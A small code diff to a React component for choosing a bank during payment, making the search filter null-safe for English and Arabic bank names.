@@ -26,10 +26,11 @@ const PaymentBankSelector = () => {
   const rawAmount = linkData?.payload?.cod_amount || 500;
   const formattedAmount = formatCurrency(rawAmount, selectedCountry);
 
-  const filteredBanks = banks.filter(bank =>
-    bank.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
-    bank.nameAr.includes(searchTerm)
-  );
+  const filteredBanks = banks.filter(bank => {
+    const nameMatch = bank.name ? bank.name.toLowerCase().includes(searchTerm.toLowerCase()) : false;
+    const nameArMatch = bank.nameAr ? bank.nameAr.includes(searchTerm) : false;
+    return nameMatch || nameArMatch;
+  });
 
   const handleBankSelect = async (bankId: string) => {
     try {
